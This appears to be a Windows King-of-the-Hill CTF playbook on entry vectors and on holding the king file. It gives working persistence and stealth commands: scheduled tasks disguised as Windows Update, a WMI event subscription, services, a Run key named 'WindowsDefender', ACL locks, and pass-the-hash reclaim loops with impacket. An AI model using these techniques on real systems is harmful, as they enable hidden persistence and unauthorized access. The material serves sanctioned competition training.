# Windows KotH Playbook

Windows-specific King-of-the-Hill mechanics and hold strategy.
Use alongside `windows_pentest_playbook.md` for initial access.

---

## King File Location

Unlike Linux (always `/root/king.txt`), Windows KotH king files vary by box:
```cmd
:: Check these locations immediately on gaining access:
dir C:\king.txt 2>nul
dir C:\Users\king.txt 2>nul
dir C:\Users\Administrator\king.txt 2>nul
dir C:\Users\Public\king.txt 2>nul
dir C:\Windows\Temp\king.txt 2>nul
dir C:\inetpub\wwwroot\king.txt 2>nul
type C:\king.txt 2>nul

:: Find it if none of the above:
dir /s /b king.txt 2>nul
```

---

## Common Windows KotH Box Types

### Type 1: MS17-010 (EternalBlue) — most common
- Usually Windows 7 or Server 2008 R2
- Direct SYSTEM shell via exploit
- No privesc needed
- Hold via scheduled task or service at SYSTEM level
- Opponent also using EternalBlue → stable multi-root fight

### Type 2: IIS / Web Application
- Foothold as IIS AppPool (low priv)
- Requires privesc via token impersonation (SeImpersonatePrivilege almost always present on IIS)
- GodPotato → SYSTEM in seconds
- Hold at SYSTEM level

### Entry Vector Research Gate
- If the foothold path is stalled but the target exposes a concrete Windows service/app/framework version, switch to public upstream source research before more blind tuning.
- Helper path:
  ```bash
  python3 ${CTF_ROOT}/scripts/service-source-map.py --service "<banner or product string>"
  bash ${CTF_ROOT}/scripts/version-research.sh \
    --service "<banner or product string>" \
    --target <KOTH_IP> \
    --suspected-class "windows koth entry foothold"
  ```
- Good uses:
  - IIS app or CMS version known but upload/auth bypass is unclear
  - Exchange/SharePoint/Confluence/Jenkins/Tomcat/other app version known and exploit guidance is weak
  - WinRM/SMB credential path is dry, but web stack version evidence suggests a faster public-code branch
- Return from research with:
  - one bounded foothold hypothesis
  - one proof check
  - one pivot condition if it fails

### Type 3: Windows with exposed services (SMB, RDP, WinRM)
- Credential spray or reuse from previous box
- Direct shell via Evil-WinRM / PSExec
- May need privesc if shell is not admin

### Type 4: Active Directory / Domain boxes
- More complex — may need lateral movement to reach DC/king host
- Multiple hold points possible (each machine in pivot chain)
- Persistence on DC is most stable

---

## Hold Strategies (ranked by stability)

### 1. Scheduled Task (BEST — survives reboot, hard to find)
```cmd
:: Install hold as SYSTEM with disguised name
schtasks /create /sc MINUTE /mo 1 ^
  /tn "Microsoft\Windows\WindowsUpdate\Sync" ^
  /tr "cmd /c echo <OPERATOR_NAME> > C:\king.txt" ^
  /ru SYSTEM /f

:: Verify
schtasks /query /tn "Microsoft\Windows\WindowsUpdate\Sync" /v | findstr "Status\|Next Run"

:: Check king file is being updated
type C:\king.txt
```

Name pattern: hide under `Microsoft\Windows\WindowsUpdate\`, `Microsoft\Windows\Maintenance\`, or `Microsoft\Windows\Defrag\`.

### 2. WMI Event Subscription (STEALTHIEST — no registry keys, no visible task)
```powershell
$Name = 'KingHold'
$Cmd = 'cmd.exe /c echo <OPERATOR_NAME> > C:\king.txt'
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

$Filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$Filter.Name = $Name
$Filter.QueryLanguage = 'WQL'
$Filter.Query = $Query
$Filter.EventNamespace = 'root\cimv2'
$Filter.Put()

$Consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$Consumer.Name = $Name
$Consumer.ExecutablePath = 'C:\Windows\System32\cmd.exe'
$Consumer.CommandLineTemplate = $Cmd
$Consumer.Put()

$Binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$Binding.Filter = $Filter
$Binding.Consumer = $Consumer
$Binding.Put()
```
Fires every ~10 seconds. Survives reboot. Not visible in schtasks or sc query.

### 3. Service (persistent but visible in sc query)
```cmd
:: Create as SYSTEM service
sc create KingHold binpath= "cmd /c echo <OPERATOR_NAME> > C:\king.txt" type= own start= auto obj= LocalSystem
sc description KingHold "Windows Update Assistant"
sc start KingHold
:: Service exits after one write, but auto-restart handles it with OnFailure:
sc failure KingHold reset= 0 actions= restart/1000/restart/1000/restart/1000
```

### 4. Registry Run Key (easy for opponents to find — last resort)
```cmd
:: SYSTEM run key (requires admin):
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" ^
  /v "WindowsDefender" /t REG_SZ ^
  /d "cmd /c echo <OPERATOR_NAME> > C:\king.txt" /f
```

### 5. Active Shell Loop (fragile — lost on connection drop)
```powershell
while ($true) {
    "<OPERATOR_NAME>" | Out-File -FilePath C:\king.txt -Encoding ascii -Force
    Start-Sleep -Seconds 1
}
```
Only use this as a supplement to a scheduled task, not as primary hold.

---

## Remote Hold from Kali (via koth-windows-hold.sh)

```bash
bash ${CTF_ROOT}/scripts/koth-windows-hold.sh \
  --target TARGET_IP \
  --user Administrator \
  --pass PASSWORD \
  --name <OPERATOR_NAME> \
  --interval 2

# Or with NTLM hash (pass-the-hash):
bash ${CTF_ROOT}/scripts/koth-windows-hold.sh \
  --target TARGET_IP \
  --user Administrator \
  --hash NTLM_HASH \
  --name <OPERATOR_NAME>
```

---

## ACL Lock on King File

Lock opponents out of writing the king file (as SYSTEM):
```cmd
:: Remove all inherited permissions, grant only SYSTEM full control
icacls C:\king.txt /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:F"
icacls C:\king.txt

:: Verify — other users should now get "Access is denied" on write
:: NOTE: This may be against THM rules if it prevents legitimate service writes.
:: Only use if the king file is intended to be freely writable by all.
:: Check room rules before applying.
```

Make the king file hidden + system-attributed to reduce detection:
```cmd
attrib +H +S C:\king.txt
```

---

## Opponent Counter-Techniques (and our response)

| Opponent action | Detection | Our response |
|----------------|-----------|--------------|
| Kill our process | Check `tasklist` | Scheduled task restarts automatically |
| Delete scheduled task | `schtasks /query` shows removed | Re-install from hold script |
| Overwrite king file | Content changes | Burst 5 rapid rewrites |
| Add their own schtask | `schtasks /query /fo LIST /v` | Find and remove, add ours back |
| Disable WinRM | `crackmapexec winrm` fails | Fallback to wmiexec / smbexec |
| Change Admin password | Auth fails | Use NTLM hash (PtH) if cached |
| Add firewall rule blocking us | Connection times out | Already inside via schtask |
| Remove our user | Login fails | Already running as SYSTEM |

---

## Connection Fallback Chain

The `koth-windows-hold.sh` script tries these in order:
1. **Evil-WinRM** (port 5985/5986) — preferred, interactive shell
2. **wmiexec** (impacket) — fileless, WMI-based
3. **smbexec** (impacket) — SMB-based
4. **psexec** (impacket) — creates service, louder

For each: tries password first, then NTLM hash if password fails.

---

## Rapid Reclaim Procedure (lost king)

```bash
# 1. Verify we can still connect
crackmapexec winrm TARGET_IP -u USER -p PASS

# 2. Write burst from Kali
for i in {1..10}; do
  impacket-wmiexec -nooutput DOMAIN/USER:PASS@TARGET_IP \
    "cmd /c echo <OPERATOR_NAME> > C:\king.txt" 2>/dev/null &
done
wait

# 3. Check if scheduled task is still running
evil-winrm -i TARGET_IP -u USER -p PASS -c \
  'schtasks /query /tn "Microsoft\Windows\WindowsUpdate\Sync"'

# 4. If task was removed, re-install
# (koth-windows-hold.sh detects and re-installs automatically)
```

---

## Windows KotH Rules Reference

Same THM rules apply — Windows specifics:
- **R1/R2**: Do not shut down, reboot, or break Windows services (IIS, WinRM, SMB, RDP must stay up)
- **R4**: Do not modify the king service / binary that writes the king file
- **R5**: No DoS — don't flood WinRM/SMB to block opponents
- **R8**: Do not delete system binaries (cmd.exe, powershell.exe, etc.) or change their permissions

Safe for Windows:
- Scheduled tasks, services, registry keys (all fair game)
- File ACL modification on king.txt (depends on room — check)
- Password changes on non-king accounts
- Firewall rules (adding, not blocking the king service port)
